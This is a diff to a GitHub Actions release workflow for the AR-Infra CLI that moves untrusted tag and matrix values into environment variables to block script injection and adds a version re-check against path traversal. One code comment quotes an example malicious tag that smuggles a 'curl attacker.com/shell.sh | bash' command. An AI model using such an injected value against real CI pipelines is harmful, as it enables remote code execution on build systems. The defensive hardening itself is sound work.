@@ -19,9 +19,14 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v4
 
+      # FIX: github.ref_name moved to env var -- never interpolated directly into shell.
+      # Prevents CWE-78 script injection: attacker could push tag "v1.0.0; curl attacker.com/shell.sh | bash"
+      # Ref: https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections
       - name: Verify tag format
+        env:
+          REF_NAME: ${{ github.ref_name }}
         run: |
-          if [[ ! "${{ github.ref_name }}" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+          if [[ ! "$REF_NAME" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
             echo "Error: Tag must follow semantic versioning (e.g., v0.2.0)"
             exit 1
           fi
@@ -106,47 +111,58 @@ jobs:
 
       - name: Verify Linux binary
         if: runner.os == 'Linux'
+        env:
+          ARTIFACT_NAME: ${{ matrix.artifact_name }}
         run: |
           cd dist
-          file ${{ matrix.artifact_name }}
-          ldd ${{ matrix.artifact_name }} || echo "Static binary or non-ELF"
+          file "$ARTIFACT_NAME"
+          ldd "$ARTIFACT_NAME" || echo "Static binary or non-ELF"
         shell: bash
 
       - name: Rename binary
+        env:
+          ARTIFACT_NAME: ${{ matrix.artifact_name }}
+          ASSET_NAME: ${{ matrix.asset_name }}
         run: |
           cd dist
-          mv ${{ matrix.artifact_name }} ${{ matrix.asset_name }}
+          mv "$ARTIFACT_NAME" "$ASSET_NAME"
         shell: bash
 
       - name: Test binary
+        env:
+          ASSET_NAME: ${{ matrix.asset_name }}
         run: |
           cd dist
           if [[ "${{ runner.os }}" == "Windows" ]]; then
-            ./${{ matrix.asset_name }} --version
-            ./${{ matrix.asset_name }} init --help
-            ./${{ matrix.asset_name }} add-dependency --help
+            "./$ASSET_NAME" --version
+            "./$ASSET_NAME" init --help
+            "./$ASSET_NAME" add-dependency --help
           else
-            chmod +x ./${{ matrix.asset_name }}
-            ./${{ matrix.asset_name }} --version
-            ./${{ matrix.asset_name }} init --help
-            ./${{ matrix.asset_name }} add-dependency --help
+            chmod +x "./$ASSET_NAME"
+            "./$ASSET_NAME" --version
+            "./$ASSET_NAME" init --help
+            "./$ASSET_NAME" add-dependency --help
           fi
         shell: bash
 
       - name: Calculate SHA256 checksum (Unix)
         if: runner.os != 'Windows'
+        env:
+          ASSET_NAME: ${{ matrix.asset_name }}
         run: |
           cd dist
-          shasum -a 256 ${{ matrix.asset_name }} > ${{ matrix.asset_name }}.sha256
+          shasum -a 256 "$ASSET_NAME" > "$ASSET_NAME.sha256"
         shell: bash
 
       - name: Calculate SHA256 checksum (Windows)
         if: runner.os == 'Windows'
+        env:
+          ASSET_NAME: ${{ matrix.asset_name }}
         run: |
           cd dist
-          $hash = (Get-FileHash -Path "${{ matrix.asset_name }}" -Algorithm SHA256).Hash.ToLower()
-          $filename = "${{ matrix.asset_name }}"
-          "$hash  $filename" | Out-File -Encoding ascii -NoNewline "${{ matrix.asset_name }}.sha256"
+          $hash = (Get-FileHash -Path "$env:ASSET_NAME" -Algorithm SHA256).Hash.ToLower()
+          $filename = "$env:ASSET_NAME"
+          "$hash  $filename" | Out-File -Encoding ascii -NoNewline "$env:ASSET_NAME.sha256"
         shell: pwsh
 
       - name: Upload build artifact
@@ -173,7 +189,7 @@ jobs:
           fetch-depth: 0
 
       - name: Download all artifacts
-        uses: actions/download-artifact@v7
+        uses: actions/download-artifact@v4
         with:
           path: dist-artifacts
 
@@ -197,87 +213,97 @@ jobs:
           echo "previous_tag=${PREVIOUS_TAG:-$(git rev-list --max-parents=0 HEAD)}" >> $GITHUB_OUTPUT
 
       - name: Generate release notes
+        env:
+          VERSION: ${{ steps.version.outputs.version }}
+          PREVIOUS_TAG: ${{ steps.version.outputs.previous_tag }}
+          REPO: ${{ github.repository }}
+          REF_NAME: ${{ github.ref_name }}
+          SERVER_URL: ${{ github.server_url }}
         run: |
-          VERSION="${{ steps.version.outputs.version }}"
-          PREVIOUS_TAG="${{ steps.version.outputs.previous_tag }}"
+          # Defense-in-depth: re-validate VERSION before using it in a file path (CWE-22).
+          # security-gate already checked this, but we never trust a single gate for path construction.
+          if [[ ! "$VERSION" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+            echo "ERROR: Invalid version format -- aborting to prevent path traversal"
+            exit 1
+          fi
 
           if [ -f "release-notes/${VERSION}.md" ]; then
             echo "Using custom release notes from release-notes/${VERSION}.md"
             cat "release-notes/${VERSION}.md" > release_notes.md
           else
             echo "Generating default release notes"
-            cat > release_notes.md << 'EOF'
-          ## AR-Infra CLI ${{ github.ref_name }}
+            cat > release_notes.md << EOF
+          ## AR-Infra CLI ${REF_NAME}
 
           Production-ready Spring Boot project generator with MySQL support and enhanced dependency management.
 
           ### What's Changed
 
-          See the [full changelog](https://github.com/${{ github.repository }}/compare/${PREVIOUS_TAG}...${{ github.ref_name }}) for details.
+          See the [full changelog](https://github.com/${REPO}/compare/${PREVIOUS_TAG}...${REF_NAME}) for details.
 
           ### Installation Methods
 
           #### Option 1: Binary (Recommended - No Python Required)
 
           **Linux (x86_64) - Compatible with Ubuntu, Debian, Fedora, CentOS, RHEL, etc.:**
-          ```bash
-          curl -LO https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/ar-infra-linux-amd64
-          curl -LO https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/ar-infra-linux-amd64.sha256
+          \`\`\`bash
+          curl -LO https://github.com/${REPO}/releases/download/${REF_NAME}/ar-infra-linux-amd64
+          curl -LO https://github.com/${REPO}/releases/download/${REF_NAME}/ar-infra-linux-amd64.sha256
           shasum -a 256 -c ar-infra-linux-amd64.sha256
           chmod +x ar-infra-linux-amd64
           sudo mv ar-infra-linux-amd64 /usr/local/bin/ar-infra
-          ```
+          \`\`\`
 
           **macOS (Intel):**
-          ```bash
-          curl -LO https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/ar-infra-macos-amd64
-          curl -LO https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/ar-infra-macos-amd64.sha256
+          \`\`\`bash
+          curl -LO https://github.com/${REPO}/releases/download/${REF_NAME}/ar-infra-macos-amd64
+          curl -LO https://github.com/${REPO}/releases/download/${REF_NAME}/ar-infra-macos-amd64.sha256
           shasum -a 256 -c ar-infra-macos-amd64.sha256
           chmod +x ar-infra-macos-amd64
           sudo mv ar-infra-macos-amd64 /usr/local/bin/ar-infra
-          ```
+          \`\`\`
 
           **macOS (Apple Silicon):**
-          ```bash
-          curl -LO https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/ar-infra-macos-arm64
-          curl -LO https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/ar-infra-macos-arm64.sha256
+          \`\`\`bash
+          curl -LO https://github.com/${REPO}/releases/download/${REF_NAME}/ar-infra-macos-arm64
+          curl -LO https://github.com/${REPO}/releases/download/${REF_NAME}/ar-infra-macos-arm64.sha256
           shasum -a 256 -c ar-infra-macos-arm64.sha256
           chmod +x ar-infra-macos-arm64
           sudo mv ar-infra-macos-arm64 /usr/local/bin/ar-infra
-          ```
+          \`\`\`
 
           **Windows (PowerShell as Administrator):**
-          ```powershell
-          Invoke-WebRequest -Uri "https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/ar-infra-windows-amd64.exe" -OutFile "ar-infra.exe"
-          Invoke-WebRequest -Uri "https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/ar-infra-windows-amd64.exe.sha256" -OutFile "ar-infra.exe.sha256"
+          \`\`\`powershell
+          Invoke-WebRequest -Uri "https://github.com/${REPO}/releases/download/${REF_NAME}/ar-infra-windows-amd64.exe" -OutFile "ar-infra.exe"
+          Invoke-WebRequest -Uri "https://github.com/${REPO}/releases/download/${REF_NAME}/ar-infra-windows-amd64.exe.sha256" -OutFile "ar-infra.exe.sha256"
           certutil -hashfile ar-infra.exe SHA256
           Move-Item ar-infra.exe C:\Windows\System32\ar-infra.exe
-          ```
+          \`\`\`
 
           #### Option 2: Install via pip/pipx (Python Required)
-          ```bash
+          \`\`\`bash
           pipx install ar-infra-cli
 
           pip install ar-infra-cli
-          ```
+          \`\`\`
 
           ### Quick Start
-          ```bash
+          \`\`\`bash
           ar-infra init
 
           ar-infra init --group=com.example --artifact=myapp --features=mysql,rabbitmq
 
           ar-infra add-dependency "implementation 'io.jsonwebtoken:jjwt-api:0.13.0'"
-          ```
+          \`\`\`
 
           ### What's New in This Release
 
           - **MySQL Database Support**: Choose between PostgreSQL and MySQL during initialization
-          - **New `add-dependency` Command**: Add Gradle dependencies to existing projects
+          - **New \`add-dependency\` Command**: Add Gradle dependencies to existing projects
           - **Enhanced Feature Selection**: Separate database choice from infrastructure components
           - **Template Compatibility**: Tag-based cloning ensures version compatibility
           - **OpenAPI Documentation**: SwaggerHandler removes unused endpoints based on features
-          - **`--no-feature` Flag**: Generate minimal Spring Boot projects without infrastructure
+          - **\`--no-feature\` Flag**: Generate minimal Spring Boot projects without infrastructure
 
           ### Platform Compatibility
 
@@ -289,11 +315,11 @@ jobs:
 
           - Verify checksums before installation
           - Binaries built via GitHub Actions with full audit trail
-          - [View source code](${{ github.server_url }}/${{ github.repository }})
+          - [View source code](${SERVER_URL}/${REPO})
 
           ### Documentation
 
-          Full documentation: https://github.com/${{ github.repository }}
+          Full documentation: https://github.com/${REPO}
           EOF
           fi
 
